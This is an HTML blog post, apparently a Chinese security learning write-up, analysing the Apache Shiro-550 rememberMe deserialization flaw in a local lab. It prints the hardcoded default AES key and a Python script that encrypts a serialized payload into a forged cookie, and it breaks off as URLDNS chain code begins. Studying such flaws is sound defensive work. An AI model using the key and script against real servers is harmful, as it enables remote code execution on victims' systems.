@@ -1,0 +1,622 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Shiro Attack | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro550"><span class="toc-number">3.</span> <span class="toc-text">Shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decrypt"><span class="toc-number">3.2.1.</span> <span class="toc-text">decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#deserialize"><span class="toc-number">3.2.2.</span> <span class="toc-text">deserialize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">加密过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS%E9%93%BE"><span class="toc-number">3.4.1.</span> <span class="toc-text">URLDNS链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CB%E9%93%BE"><span class="toc-number">3.4.2.</span> <span class="toc-text">CB链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC11%E9%93%BE"><span class="toc-number">3.4.3.</span> <span class="toc-text">CC11链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.5.</span> <span class="toc-text">漏洞探测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro721"><span class="toc-number">4.</span> <span class="toc-text">Shiro721</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Shiro Attack</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/15
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Java/" style="color: #03a9f4">Java</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>しろ（Shi ro）</p>
+<p>走完CB链再回来看这个</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://natro92.fun/posts/4b382a45/">https://natro92.fun/posts/4b382a45/</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
+<p>《Java安全漫谈》</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境：jdk1.8 + tomcat 8.5.98 + shiro 1.2.4</p>
+<p>这里直接用p神的项目了：<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
+<p>下载后直接用IDEA打开，配置一下tomcat环境</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715212213428.png" alt="image-20240715212213428"></p>
+<p>运行配置</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715213701618.png" alt="image-20240715213701618"></p>
+<blockquote>
+<p>Tips：如果tomcat控制台日志出现乱码，请修改 tomcat 服务器文件夹下的 &#x2F;conf&#x2F;logging.properties，将里面的encoding全部换成GBK</p>
+</blockquote>
+<blockquote>
+<p>Tips：只有下载了源码才能在全局搜索中搜到对应调用的方法：请在 设置-Maven-正在导入 内修改</p>
+</blockquote>
+<p>然后<strong>等待tomcat服务完全启动</strong>之后访问 tomcat 服务器文件夹下 webapps 里对应的路由即可，这里是 Shiro_war</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240917205033099.png" alt="image-20240917205033099"></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715214344403.png" alt="image-20240715214344403"></p>
+<p>账密在 shiro.ini 里</p>
+<hr>
+<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550）</p>
+<p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 <code>rememberMe=deleteMe</code> 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，其值经过了序列化，AES加密，Base64加密三步，那么就可以利用这个 rememberMe  进行反序列化，从而 getshell</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240917231819515.png" alt="image-20240917231819515"></p>
+<hr>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>逆向分析，从 Cookie 的加密过程入手，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 包里的类</p>
+<p>最终是找到了<code>CookieRememberMeManager</code>这个类，观察<code>getRememberedSerializedIdentity</code>方法</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240917232353797.png" alt="image-20240917232353797"></p>
+<p>分析代码，先判断是否为 http 请求，是的话获取 cookie 参数</p>
+<p>然后判断 cookie 值是否为 deleteMe</p>
+<p>不是的话则判断是否符合base64的编码长度，然后进行base64解码并返回</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240917233000878.png" alt="image-20240917233000878"></p>
+<p>现在 ctrl+shift+alt+f7 找一下调用了<code>getRememberedSerializedIdentity</code>的方法</p>
+<p>找到了 <code>AbstractRememberMeManager#getRememberedPrincipals</code> 方法</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240917233239471.png" alt="image-20240917233239471"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">getRememberedPrincipals</span><span class="token punctuation">(</span><span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">PrincipalCollection</span> principals <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">getRememberedSerializedIdentity</span><span class="token punctuation">(</span>subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> bytes<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            principals <span class="token operator">=</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> re<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        principals <span class="token operator">=</span> <span class="token function">onRememberedPrincipalFailure</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> principals<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里先调用了 <code>getRememberedSerializedIdentity</code> 取出 cookie 给 bytes 数组</p>
+<p>然后 bytes 数组里面的内容会进 <code>convertBytesToPrincipals</code> 方法，最后返回</p>
+<p>现在看看<code>convertBytesToPrincipals</code>方法：</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920160718393.png" alt="image-20240920160718393"></p>
+<p>沃趣，deserialize，别急</p>
+<h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>先看前面 <code>decrypt</code> 解密的操作：</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920160939854.png" alt="image-20240920160939854"></p>
+<p>先用<code>getCipherService</code>获取密钥服务，即AOP的实现类</p>
+<p>接下来看<code>cipherService.decrypt</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ByteSource</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionKey<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CryptoException</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>传入两个参数，第一个是加密的 cookie ，第二个是 key</p>
+<p>看一下这里作为 key 的<code>getDecryptionCipherKey()</code>方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> decryptionCipherKey<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>是个常量，找一下是谁调用了<code>decryptionCipherKey</code></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920161724549.png" alt="image-20240920161724549"></p>
+<p>前者是 getDecryptionCipherKey ，而后者是 <code>setDecryptionCipherKey</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>decryptionCipherKey <span class="token operator">=</span> decryptionCipherKey<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>一路往上跟</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920161910451.png" alt="image-20240920161910451"></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920161929641.png" alt="image-20240920161929641"></p>
+<p>至此，得到我们在找的常量名<code>DEFAULT_CIPHER_KEY_BYTES</code>，跟进去看看</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920162036280.png" alt="image-20240920162036280"></p>
+<p>是一个硬编码在源码里的固定key：<code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
+<p>于是在这里，我们发现 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量</p>
+<hr>
+<h3 id="deserialize"><a href="#deserialize" class="headerlink" title="deserialize"></a>deserialize</h3><p>现在回到刚才的位置看看 <code>deserialize</code> 方法，跟进去</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920163026936.png" alt="image-20240920163026936"></p>
+<p>是个接口，继续跟看看谁实现了这个接口</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920163229056.png" alt="image-20240920163229056"></p>
+<p>ctrl+alt+b 查找接口的实现类</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920163746751.png" alt="image-20240920163746751"></p>
+<p>进<code>DefaultSerializer</code>看看</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920164154462.png" alt="image-20240920164154462"></p>
+<p>调用了 readObject ，是了，这就是我们的入口类</p>
+<hr>
+<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>要伪造cookie，就得先熟悉加密流程</p>
+<p>直接下断点在<code>AbstractRememberMeManager#onSuccessfulLogin</code>里面，因为要开启<code>rememberMe</code>选项，所以直接锁定这里的<code>isRememberMe(token)</code>，判断有没有选中 RememberMe</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920165705185.png" alt="image-20240920165705185"></p>
+<p>然后进入<code>rememberIdentity</code></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920170030379.png" alt="image-20240920170030379"></p>
+<p><code>getIdentityToRemember</code>里面一串调用会保存用户名</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920170258365.png" alt="image-20240920170258365"></p>
+<p>接下来回到<code>rememberIdentity</code>，传入两个参数进入重写的<code>rememberIdentity</code></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920170829920.png" alt="image-20240920170829920"></p>
+<p>进入 <code>convertPrincipalsToBytes</code> 方法，和之前解密部分里面的<code>convertBytesToPrincipals</code>相似，不过将解密变成了加密，反序列化变成了序列化</p>
+<p>先看 serialize</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920171021995.png" alt="image-20240920171021995"></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920171133442.png" alt="image-20240920171133442"></p>
+<p>然后看 encrypt </p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920171402932.png" alt="image-20240920171402932"></p>
+<p><code>cipherService</code>直接告诉我们是AES了，然后是<code>getEncryptionCipherKey</code>方法和前面解密同理，一路跟过去可以知道是那个硬编码的常量</p>
+<p>接下来就是<code>rememberSerializedIdentity</code>方法</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920171956644.png" alt="image-20240920171956644"></p>
+<p>cookie过一次base64编码，就这样</p>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先当然是准备一个AES加密脚本，上面 cipherService 那里也展示了相关的参数，比如加密模式是CBC：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> uuid
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+
+
+<span class="token keyword">def</span> <span class="token function">aes_enc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
+    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
+    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
+    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>
+    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> ciphertext
+
+
+<span class="token keyword">def</span> <span class="token function">aes_dec</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    enc_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span>
+    unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
+    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
+    iv <span class="token operator">=</span> enc_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    plaintext <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    plaintext <span class="token operator">=</span> unpad<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> plaintext
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    filename <span class="token operator">=</span> <span class="token string">r"D:\Code\Java\Test\ser.bin"</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>aes_enc<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>URLDNS 只需要 JDK 的包，所以一般用于检测是否存在反序列化漏洞，掏出之前写的urldns</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>urldns</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
